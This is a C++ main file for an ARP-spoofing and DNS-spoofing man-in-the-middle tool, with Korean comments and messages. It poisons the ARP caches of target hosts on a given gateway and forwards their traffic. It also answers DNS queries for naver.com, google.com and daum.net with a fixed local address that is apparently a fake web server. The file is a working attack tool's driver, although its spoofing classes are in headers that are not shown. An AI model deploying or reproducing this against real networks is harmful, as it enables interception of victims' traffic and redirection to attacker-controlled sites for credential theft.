#include "network_utils.hpp"
#include "arp_spoof.hpp"
#include "dns_spoofer.hpp"
#include "packet_forwarder.hpp"
#include <csignal>
#include <iostream>
#include <cstdlib>
#include <unistd.h>
#include <atomic>
#include <memory>

using namespace std;

atomic<bool> global_running(true);

void signal_handler(int signum) 
{
    if (signum == SIGINT) 
    {
        cout << "\n프로그램 종료 중...\n";
        global_running = false;
    }
}

int main(int argc, char* argv[]) 
{
    if (argc < 4) 
    {
        cerr << "사용법: " << argv[0] << " <인터페이스> <게이트웨이 IP> <대상 IP1> [대상 IP2 ...]\n";
        return 1;
    }
    
    string interface = argv[1];
    string gateway_ip = argv[2];
    
    // DNS 스푸퍼 객체 생성 및 템플릿 초기화
    auto dnsSpoofer = make_unique<DnsSpoofer>();
    bool templates_loaded = dnsSpoofer->initialize_templates(
        "data/dns_naver2.pcapng", 
        "data/dns_google2.pcapng", 
        "data/dns_daum2.pcapng"
    );
    if (!templates_loaded) 
    {
        cerr << "경고: 일부 DNS 템플릿을 로드하지 못했습니다. \n";
    }
    // recovery_domains 리스트를 main.cpp에서 관리
    std::vector<std::string> recovery_domains = {"www.naver.com", "www.google.com", "www.daum.net"};
    dnsSpoofer->setRecoveryDomains(recovery_domains);
    
    // web 주소
    std::string desired_spoof_ip = "192.168.127.132"; 
    dnsSpoofer->setSpoofIP(desired_spoof_ip);

    // IP 포워딩 활성화
    ArpSpoofer::enable_ip_forwarding();
    signal(SIGINT, signal_handler);
    
    // ArpSpoofer 객체 생성 및 초기화
    auto spoofer = make_unique<ArpSpoofer>(interface);
    if (!spoofer->initialize()) 
    {
        return 1;
    }
    if (!spoofer->set_gateway(gateway_ip))
    {
        return 1;
    }
    for (int i = 3; i < argc; i++) 
    {
        string target_ip = argv[i];
        if (!spoofer->add_target(target_ip))
        {
            cerr << "대상 추가 실패: " << target_ip << "\n";
        }
    }
    spoofer->update_filter();
    spoofer->start_spoofing_all();
    
    // PacketForwarder 객체 생성
    PacketForwarder forwarder(spoofer->get_handle(), spoofer.get(), dnsSpoofer.get());
    forwarder.start();
    
    cout << "실행 중...\n";
    while (global_running)
        sleep(1);
    
    forwarder.stop();
    spoofer->stop_all();
    ArpSpoofer::disable_ip_forwarding();
    
    cout << "프로그램이 정상적으로 종료되었습니다.\n";
    return 0;
}
